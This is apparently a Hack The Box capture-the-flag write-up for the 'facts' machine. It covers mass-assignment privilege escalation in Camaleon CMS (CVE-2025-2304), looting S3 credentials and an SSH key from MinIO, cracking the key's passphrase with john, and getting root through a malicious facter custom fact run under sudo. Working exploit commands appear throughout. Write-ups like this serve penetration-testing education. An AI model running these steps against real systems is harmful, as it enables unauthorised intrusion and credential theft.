facts

Hack The Box  ·  category: web / privesc  ·  foothold → root

Recon

I started with an Nmap service scan of the target.

PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 9.9p1 Ubuntu 3ubuntu3.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 4d:d7:b2:8c:d4:df:57:9c:a4:2f:df:c6:e3:01:29:89 (ECDSA)
|_  256 a3:ad:6b:2f:4a:bf:6f:48:ac:81:b9:45:3f:de:fb:87 (ED25519)
80/tcp    open  http    nginx 1.26.3 (Ubuntu)
54321/tcp open  http    MinIO (Golang net/http server)

The target had SSH on port 22, a web application on port 80, and an unknown service on port 54321. Researching further, I confirmed port 54321 was running MinIO, an S3-compatible object storage server.

Web enumeration

The web application appeared to be a content/blog platform. Nothing obvious on the surface, so I ran a directory scan which revealed several endpoints: 

/admin     (Status: 302) --> /admin/login
/search    (Status: 200)
/post      (Status: 200)
/error     (Status: 500)

The /admin redirect caught my attention first. After registering a standard user account and exploring the dashboard, I noticed the CMS version was leaked in the footer: Camaleon CMS 2.9.0, built on Ruby on Rails.

I searched for known CVEs for that version and found a working proof-of-concept:

CVE-2025-2304 — Mass assignment via permit!

Foothold — CVE-2025-2304 (mass assignment)

Camaleon CMS 2.9.0 uses permit! in its Rails strong parameters instead of an explicit allowlist. That means all user-supplied fields are accepted without filtering — including sensitive ones like role. By injecting password[role]=admin into a password-update request, a regular user can escalate their own account to admin. 

python3 exploit.py -u http://facts.htb/ -U Milo4 -P 1234 -e -r

This escalated my account to admin. Inside the admin panel, the S3 credentials for the MinIO instance were exposed.

S3 enumeration

Using the leaked credentials I enumerated the MinIO bucket via the AWS CLI:

aws s3 ls --endpoint-url http://10.129.18.244:54321
aws s3 sync s3://internal/ ./loot/ --endpoint-url http://10.129.18.244:54321

Inside the bucket I found a .ssh directory containing two files:

authorized_keys
id_ed25519

Cracking the SSH key

The private key was passphrase-protected. I converted it to a crackable hash and ran it against rockyou: 

ssh2john id_ed25519 > id_hash
john --wordlist=/usr/share/wordlists/rockyou.txt id_hash

The passphrase cracked as: dragonballz

Finding the username

With the passphrase in hand, I extracted the public key from the private key to reveal the username stored in the comment field: 

ssh-keygen -y -f id_ed25519
# ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAA... trivia@facts.htb

Username: trivia

SSH access

chmod 600 id_ed25519
ssh -i id_ed25519 trivia@10.129.18.244

I gained a shell and found the user flag in the william home directory.

trivia@facts:~$ cat /home/william/user.txt
<user-flag-here>

Privilege escalation

With the user flag in hand, I started enumerating privesc vectors, beginning with:

sudo -l

This revealed that facter could be run as root by my user with no password required.

Checking GTFOBins for facter, I found it can execute arbitrary Ruby code via a custom facts directory passed with --custom-dir. The plan: drop a malicious .rb file that spawns a shell. 

mkdir -p /dev/dev/facts/
echo 'exec "/bin/sh"' > /dev/dev/facts/root.rb

Then run facter as root, pointing it at the custom directory:

sudo facter --custom-dir=/dev/dev/facts

This spawned a root shell, and I obtained the root flag.

root@facts:~# cat /root/root.txt
<root-flag-here>

Takeaways

  • A Rails app using permit! instead of an explicit allowlist is a mass-assignment waiting to happen — role should never be user-settable.
  • Object storage (MinIO/S3) reachable from an app is a common secret-leak vector; always enumerate buckets once you have credentials.
  • A single passwordless sudo binary (here facter) is enough for root — GTFOBins is the first place to check.
